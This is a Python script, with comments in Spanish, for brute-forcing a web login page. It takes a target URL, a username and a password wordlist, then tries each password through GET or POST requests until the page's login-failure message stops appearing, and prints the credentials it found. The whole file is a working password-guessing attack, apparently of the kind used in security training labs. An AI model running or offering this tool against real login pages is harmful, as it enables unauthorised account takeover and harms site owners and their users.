import requests		#automatiza los get y post
from termcolor import colored

url = input('[+] Enter Page URL: ')	#necesitamos el url de la pgina
username = input('[+] Enter Username For The Account To Bruteforce: ')	#necesitamos el username de esa pagina
password_file = input('[+] Enter Password File To Use: ')
login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')
cookie_value = input('Enter Cookie Value(Optional): ')


def cracking(username,url):
	for password in passwords:	#osea con s es el archivo
		password = password.strip()	#borra caracteres vacios o cosas que nos den problemas
		print(colored(('Trying: ' + password), 'red'))		
		data = {'username':username,'password':password,'Login':'submit'}	#esto es lo que varia segun el programa lo de ' '
		if cookie_value != '':
			response = requests.get(url, params={'username':username,'password':password,'Login':'Login'}, cookies = {'Cookie': cookie_value})
		else:
			response = requests.post(url, data=data)
		if login_failed_string in response.content.decode():	#osea si encontramos el mensaje de login fail pasamos, osea seguimos iteando
			pass
		else:							#si no encontramos el msj, es por que encontramos el usuario y pw correctas
			print(colored(('[+] Found Username: ==> ' + username), 'green'))
			print(colored(('[+] Found Password: ==> ' + password), 'green'))
			exit()	#encontramos el usuario y pw salimos 




with open(password_file, 'r') as passwords:	#abrimos la carpeta donde tenemos las contrasenias a probar el r es de read
	cracking(username,url)			#funcion que creamos

print('[!!] Password Not In List')


